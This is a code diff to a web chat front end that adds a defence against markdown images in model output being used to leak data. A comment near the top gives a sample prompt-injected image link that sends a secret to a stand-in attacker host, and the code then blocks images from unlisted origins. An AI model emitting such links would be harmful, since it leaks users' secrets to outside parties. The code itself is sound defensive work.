@@ -92,9 +92,33 @@
     });
   }
 
+  // Model output can carry an image built to leak something (a prompt-injected
+  // `![](https://attacker.example/?q=<secret>)`): rendering it makes the browser fetch
+  // that URL. Only images from here, custom emoji and inline data load; any other
+  // image becomes a plain link to it.
+  const LOADABLE_IMAGE_ORIGINS = new Set([window.location.origin, 'https://cachet.dunkirk.sh']);
+  function isLoadableImage(src) {
+    try {
+      const url = new URL(src || '', window.location.href);
+      return url.protocol === 'data:' || LOADABLE_IMAGE_ORIGINS.has(url.origin);
+    } catch (e) {
+      return false;
+    }
+  }
+
   function renderMarkdown(text) {
     const raw = marked.parse(convertShortcodesHTML(text || ''));
-    return DOMPurify.sanitize(raw, { ADD_ATTR: ['target', 'rel'] });
+    // A <template> parses without loading anything, so blocked images never fetch.
+    const template = document.createElement('template');
+    template.innerHTML = DOMPurify.sanitize(raw, { ADD_ATTR: ['target', 'rel'] });
+    template.content.querySelectorAll('img').forEach((img) => {
+      if (isLoadableImage(img.getAttribute('src'))) return;
+      const link = document.createElement('a');
+      link.href = safeUrl(img.getAttribute('src')) || '#';
+      link.textContent = img.getAttribute('alt') || 'image';
+      img.replaceWith(link);
+    });
+    return template.innerHTML;
   }
 
   function linkifyExternal(container) {
